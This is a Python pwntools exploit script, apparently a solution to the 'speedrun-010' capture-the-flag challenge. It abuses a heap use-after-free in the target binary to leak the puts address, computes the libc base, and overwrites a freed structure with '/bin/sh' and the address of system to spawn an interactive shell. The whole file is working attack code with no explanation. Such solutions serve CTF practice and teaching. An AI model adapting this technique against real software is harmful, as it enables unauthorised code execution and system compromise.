from pwn import *

r = process(["./ld-2.27.so", "./speedrun-010"], env={"LD_PRELOAD": "./libc-2.27.so", "DEBUG": "true"})
libc = ELF("./libc-2.27.so")

def malloc_person(p):
    r.send('1')
    r.send(p)
    print(r.recv())

def malloc_message(m):
    r.send('2')
    r.send(m)
    return r.recv()

def free_person():
    r.send('3')
    print(r.recv())

def free_message():
    r.send('4')
    print(r.recv())

r.recv()
malloc_person('a'*23)
free_person()
leaked = malloc_message('b'*16)
print(leaked)
puts_leak = u64(leaked.split(b'b'*16)[1].split(b'\n')[0] + b'\0\0')
libc.address = puts_leak - libc.sym['puts']
log.success(f"GOT PUTS LEAK: {hex(puts_leak)}")

free_message()
malloc_person(b"/bin/sh\0"*2+b"aaaaaaa")
free_person()
malloc_message(b'/bin/sh\0'*2 + p64(libc.sym['system']))
r.interactive()

